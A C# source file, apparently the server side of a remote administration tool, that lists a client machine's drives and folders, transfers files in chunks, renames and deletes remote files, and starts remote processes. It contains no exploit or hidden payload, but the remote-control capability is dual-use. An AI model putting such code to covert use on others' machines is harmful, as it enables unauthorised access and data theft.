using Common.Enums;
using Common.IO;
using Common.Models;
using Server.Networking.Packets.FileManager;
using System.Windows.Forms;

namespace Server.Networking.Handlers
{
    public class FileManagerHandler : IDisposable
    {
        #region Event
        protected readonly SynchronizationContext SynchronizationContext;

        public delegate void StatusMessageChangedEventHandler(object sender, string message);
        public event StatusMessageChangedEventHandler StatusMessageChanged;
        private void OnStatusMessageChanged(string message)
        {
            SynchronizationContext.Post(d =>
            {
                StatusMessageChanged?.Invoke(this, (string)d);
            }, message);
        }

        public delegate void DrivesChangedEventHandler(object sender, List<Drive> drives);
        public event DrivesChangedEventHandler DrivesChanged;
        private void OnDrivesChanged(List<Drive> drives)
        {
            SynchronizationContext.Post(d =>
            {
                DrivesChanged?.Invoke(this, (List<Drive>)d);
            }, drives);
        }

        public delegate void DirectoryChangedEventHandler(object sender, string remotePath, List<FileSystemEntry> items);
        public event DirectoryChangedEventHandler DirectoryChanged;
        private void OnDirectoryChanged(string remotePath, List<FileSystemEntry> items)
        {
            SynchronizationContext.Post(i =>
            {
                DirectoryChanged?.Invoke(this, remotePath, (List<FileSystemEntry>)i);
            }, items);
        }

        public delegate void FileTransferUpdatedEventHandler(object sender, FileTransfer transfer);
        public event FileTransferUpdatedEventHandler FileTransferUpdated;
        private void OnFileTransferUpdated(FileTransfer transfer)
        {
            SynchronizationContext.Post(d =>
            {
                FileTransferUpdated?.Invoke(this, (FileTransfer)d);
            }, transfer.Clone());
        }
        #endregion

        private readonly List<FileTransfer> _activeFileTransfers = new List<FileTransfer>(); // danh sách các tiến trình upload/download đang hoạt động
        private readonly object _syncLock = new object();
        private readonly Client _client;
        private readonly Semaphore _limitThreads = new Semaphore(5, 5);// giới hạn 5 tiến trình upload đồng thời 

        private readonly string _baseDownloadPath;
        private readonly TaskManagerHandler _taskManagerHandler;

        public FileManagerHandler(Client client, string subDirectory = "")
        {
            SynchronizationContext = new SynchronizationContext();
            _client = client;
            _baseDownloadPath = Path.Combine(client.Value.DownloadDirectory, subDirectory);// thư mục lưu trữ file tải về
            _taskManagerHandler = new TaskManagerHandler(client);
            _taskManagerHandler.ProcessActionPerformed += ProcessActionPerformed;
        }

        private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
        {
            if (action != ProcessAction.Start) return;
            OnStatusMessageChanged(result ? "Process started successfully" : "Process failed to start");
        }

        public void BeginDownloadFile(string remotePath, string localFileName = "", bool overwrite = false)
        {
            if (string.IsNullOrEmpty(remotePath))
                return;

            int id = GetUniqueFileTransferId();

            if (!Directory.Exists(_baseDownloadPath))
                Directory.CreateDirectory(_baseDownloadPath);

            string fileName = string.IsNullOrEmpty(localFileName) ? Path.GetFileName(remotePath) : localFileName;
            string localPath = Path.Combine(_baseDownloadPath, fileName);

            int i = 1;
            while (!overwrite && File.Exists(localPath))
            {
                // rename file if it exists already
                var newFileName = string.Format("{0}({1}){2}", Path.GetFileNameWithoutExtension(localPath), i, Path.GetExtension(localPath));
                localPath = Path.Combine(_baseDownloadPath, newFileName);
                i++;
            }

            var transfer = new FileTransfer
            {
                Id = id,
                Type = TransferType.Download,
                LocalPath = localPath,
                RemotePath = remotePath,
                Status = "Pending...",
                //Size = fileSize, TODO: Add file size here
                TransferredSize = 0
            };

            try
            {
                transfer.FileSplit = new FileSplit(transfer.LocalPath, FileAccess.Write);
            }
            catch (Exception)
            {
                transfer.Status = "Error writing file";
                OnFileTransferUpdated(transfer);
                return;
            }

            lock (_syncLock)
            {
                _activeFileTransfers.Add(transfer);
            }

            OnFileTransferUpdated(transfer);

            _ = _client.QueuePacketAsync(new FileTransferRequest { RemotePath = remotePath, IdRequest = id });
        }

        public void BeginUploadFile(string localPath, string remotePath = "")
        {
            new Thread(() =>
            {
                int id = GetUniqueFileTransferId();

                FileTransfer transfer = new FileTransfer
                {
                    Id = id,
                    Type = TransferType.Upload,
                    LocalPath = localPath,
                    RemotePath = remotePath,
                    Status = "Pending...",
                    TransferredSize = 0
                };

                try
                {
                    transfer.FileSplit = new FileSplit(localPath, FileAccess.Read);
                }
                catch (Exception)
                {
                    transfer.Status = "Error reading file";
                    OnFileTransferUpdated(transfer);
                    return;
                }

                transfer.Size = transfer.FileSplit.FileSize;

                lock (_syncLock)
                {
                    _activeFileTransfers.Add(transfer);
                }

                transfer.Size = transfer.FileSplit.FileSize;
                OnFileTransferUpdated(transfer);

                _limitThreads.WaitOne();
                try
                {
                    foreach (var chunk in transfer.FileSplit)
                    {
                        transfer.TransferredSize += chunk.Data.Length;
                        decimal progress = transfer.Size == 0 ? 100 : Math.Round((decimal)((double)transfer.TransferredSize / (double)transfer.Size * 100.0), 2);
                        transfer.Status = $"Uploading...({progress}%)";
                        OnFileTransferUpdated(transfer);

                        bool transferCanceled;
                        lock (_syncLock)
                        {
                            transferCanceled = _activeFileTransfers.Count(f => f.Id == transfer.Id) == 0;
                        }

                        if (transferCanceled)
                        {
                            transfer.Status = "Canceled";
                            OnFileTransferUpdated(transfer);
                            _limitThreads.Release();
                            return;
                        }

                        Thread.Sleep(20);
                        _client.SendPacket(new FileTransferChunkPacket
                        {
                            IdRequest = id,
                            Chunk = chunk,
                            FilePath = remotePath,
                            FileSize = transfer.Size
                        });
                    }
                }
                catch (Exception)
                {
                    lock (_syncLock)
                    {
                        // if transfer is already cancelled, just return
                        if (_activeFileTransfers.Count(f => f.Id == transfer.Id) == 0)
                        {
                            _limitThreads.Release();
                            return;
                        }
                    }
                    transfer.Status = "Error reading file";
                    OnFileTransferUpdated(transfer);
                    CancelFileTransfer(transfer.Id);
                    _limitThreads.Release();
                    return;
                }

                _limitThreads.Release();
            }).Start();
        }

        public void CancelFileTransfer(int transferId)
        {
            _ = _client.QueuePacketAsync(new FileTransferCancelPacket { IdRequest = transferId });
        }

        public void RenameFile(string remotePath, string newPath, FileType type)
        {
            _ = _client.QueuePacketAsync(new PathRenamePacket
            {
                Path = remotePath,
                NewPath = newPath,
                PathType = type
            });
        }

        public void DeleteFile(string remotePath, FileType type)
        {
            _ = _client.QueuePacketAsync(new PathDeletePacket { Path = remotePath, PathType = type });
        }

        public void StartProcess(string remotePath)
        {
            _taskManagerHandler.StartProcess(remotePath);
        }

        public void GetDirectoryContents(string remotePath)
        {
            _ = _client.QueuePacketAsync(new GetDirectoryPacket { RemotePath = remotePath });
        }

        public void RefreshDrives()
        {
            _ = _client.QueuePacketAsync(new GetDrivesPacket());
        }

        public void Handler(StatusFileManager packet)
        {
            OnStatusMessageChanged(packet.Message);
        }

        public void Handler(GetDrivesPacket packet)
        {
            if (packet.Drives?.Count() == 0)
                return;
            OnDrivesChanged(packet.Drives);
        }

        public void Handler(GetDirectoryPacket packet)
        {
            if (packet.Items == null)
            {
                packet.Items = new();
            }
            OnDirectoryChanged(packet.RemotePath, packet.Items);
        }

        public void Handler(FileTransferCompletePacket packet)
        {
            FileTransfer transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == packet.IdRequest);
            }

            if (transfer != null)
            {
                transfer.RemotePath = packet.FilePath; // required for temporary file names generated on the client
                transfer.Status = "Completed";
                RemoveFileTransfer(transfer.Id);
                OnFileTransferUpdated(transfer);
            }
        }

        public void Handler(FileTransferCancelPacket packet)
        {
            FileTransfer transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == packet.IdRequest);
            }

            if (transfer != null)
            {
                transfer.Status = packet.Reason;
                OnFileTransferUpdated(transfer);
                RemoveFileTransfer(transfer.Id);
                // don't keep un-finished files
                if (transfer.Type == TransferType.Download)
                    File.Delete(transfer.LocalPath);
            }
        }

        public void Handler(FileTransferChunkPacket packet)
        {
            FileTransfer transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == packet.IdRequest);
            }

            if (transfer == null)
                return;

            transfer.Size = packet.FileSize;
            transfer.TransferredSize += packet.Chunk.Data.Length;

            try
            {
                transfer.FileSplit.WriteChunk(packet.Chunk);
            }
            catch (Exception)
            {
                transfer.Status = "Error writing file";
                OnFileTransferUpdated(transfer);
                CancelFileTransfer(transfer.Id);
                return;
            }

            decimal progress = transfer.Size == 0 ? 100 : Math.Round((decimal)((double)transfer.TransferredSize / (double)transfer.Size * 100.0), 2);
            transfer.Status = $"Downloading...({progress}%)";

            OnFileTransferUpdated(transfer);
        }

        private void RemoveFileTransfer(int transferId)
        {
            lock (_syncLock)
            {
                var transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == transferId);
                transfer?.FileSplit?.Dispose();
                _activeFileTransfers.RemoveAll(s => s.Id == transferId);
            }
        }

        private int GetUniqueFileTransferId()
        {
            int id;
            lock (_syncLock)
            {
                do
                {
                    id = FileTransfer.GetRandomTransferId();
                    // generate new id until we have a unique one
                } while (_activeFileTransfers.Any(f => f.Id == id));
            }

            return id;
        }

        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }
    }
}
